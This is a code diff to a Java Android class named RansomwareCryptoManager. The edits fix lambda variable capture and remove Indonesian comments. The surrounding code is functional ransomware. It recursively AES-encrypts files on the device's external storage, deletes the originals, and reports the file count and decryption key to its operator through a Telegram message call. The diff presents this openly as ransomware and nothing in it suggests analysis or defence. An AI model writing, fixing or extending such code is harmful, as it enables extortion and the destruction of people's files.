@@ -17,18 +17,20 @@ public class RansomwareCryptoManager {
         if (key == null || key.length() != 32) {
             key = generateRandomKey();
         }
-        ransomKey = key;
-        File dir = new File(path != null ? path : Environment.getExternalStorageDirectory().getAbsolutePath());
+        final String finalKey = key;
+        ransomKey = finalKey;
+        final File dir = new File(path != null ? path : Environment.getExternalStorageDirectory().getAbsolutePath());
         new Thread(() -> {
-            int count = encryptRecursive(dir, key);
-            TelegramApi.sendMessage("🔒 Ransomware: " + count + " files encrypted.\nKey: <code>" + key + "</code>");
+            int count = encryptRecursive(dir, finalKey);
+            TelegramApi.sendMessage("🔒 Ransomware: " + count + " files encrypted.\nKey: <code>" + finalKey + "</code>");
         }).start();
     }
 
     public static void decryptFiles(String path, String key) {
-        File dir = new File(path != null ? path : Environment.getExternalStorageDirectory().getAbsolutePath());
+        final String finalKey = key;
+        final File dir = new File(path != null ? path : Environment.getExternalStorageDirectory().getAbsolutePath());
         new Thread(() -> {
-            int count = decryptRecursive(dir, key);
+            int count = decryptRecursive(dir, finalKey);
             TelegramApi.sendMessage("🔓 Decrypted " + count + " files.");
             ransomKey = null;
         }).start();
@@ -75,7 +77,7 @@ public class RansomwareCryptoManager {
 
         FileInputStream fis = new FileInputStream(inputFile);
         FileOutputStream fos = new FileOutputStream(encryptedFile);
-        fos.write(iv); // Simpan IV di awal file terenkripsi
+        fos.write(iv);
         byte[] buffer = new byte[4096];
         int read;
         while ((read = fis.read(buffer)) != -1) {
@@ -86,7 +88,7 @@ public class RansomwareCryptoManager {
         if (output != null) fos.write(output);
         fis.close();
         fos.close();
-        inputFile.delete(); // Hapus file asli
+        inputFile.delete();
     }
 
     private static void decryptFile(File encryptedFile, String keyStr) throws Exception {
@@ -111,7 +113,7 @@ public class RansomwareCryptoManager {
         if (output != null) fos.write(output);
         fis.close();
         fos.close();
-        encryptedFile.delete(); // Hapus file terenkripsi
+        encryptedFile.delete();
     }
 
     private static boolean isTargetFile(File file) {
@@ -130,11 +132,11 @@ public class RansomwareCryptoManager {
     }
 
     private static String generateRandomKey() {
-        byte[] key = new byte[16]; // 128-bit (AES-128), sesuaikan jadi 32 untuk AES-256
+        byte[] key = new byte[16];
         new SecureRandom().nextBytes(key);
         StringBuilder sb = new StringBuilder();
         for (byte b : key) sb.append(String.format("%02x", b));
-        return sb.toString(); // 32-hex string untuk AES-128; gunakan panjang 64 untuk AES-256
+        return sb.toString();
     }
 
     public static String getRansomKey() { return ransomKey; }
